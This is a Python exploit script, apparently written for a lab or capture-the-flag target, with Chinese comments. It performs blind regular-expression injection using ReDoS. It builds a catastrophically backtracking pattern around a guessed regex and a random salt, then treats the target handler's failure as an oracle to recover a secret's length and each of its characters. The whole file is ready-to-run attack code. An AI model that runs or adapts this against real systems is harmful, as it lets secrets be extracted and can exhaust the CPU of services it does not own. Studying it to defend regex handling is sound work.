#!/usr/bin/env python
# encoding: utf-8

import random
import re
import string

import sys

sys.path.insert(0, "./")

from vuln import handle

THRESHOLD = 2


# 爆破字符串长度正则
def length_is(n):
    return ".{" + str(n) + "}$"


# 爆破字符串第N位字符
def nth_char_is(n, c):
    return ".{" + str(n - 1) + "}" + re.escape(c) + ".*$"


# ^(?=(some regexp here))((.*)*)*salt$
# 使用上面的正则去进行盲注攻击
def redos_if(regexp, salt):
    return "^(?={})(((.*)*)*)*{}".format(regexp, salt)


def prop_holds(prop, salt):
    return not handle(redos_if(prop, salt))


# 生成一个随机值，作为正则表达式结尾。
# 主要用来触发正则匹配失败，引发正则引擎回溯。
def generate_salt():
    return ''.join([random.choice(string.ascii_letters) for i in range(10)])


if __name__ == "__main__":
    salt = generate_salt()
    # 防止误匹配
    while not prop_holds('.*', salt):
        salt = generate_salt()
    print("[+] salt: {}".format(salt))

    upper_bound = 100
    secret_length = 0
    for i in range(0, upper_bound):
        if prop_holds(length_is(i), salt):
            secret_length = i
    print("[+] length: {}".format(secret_length))

    S = string.printable
    secret = ""
    for i in range(0, secret_length):
        for c in S:
            if prop_holds(nth_char_is(i + 1, c), salt):
                secret += c
                print("[*] {}".format(secret))
    print("[+] secret: {}".format(secret))
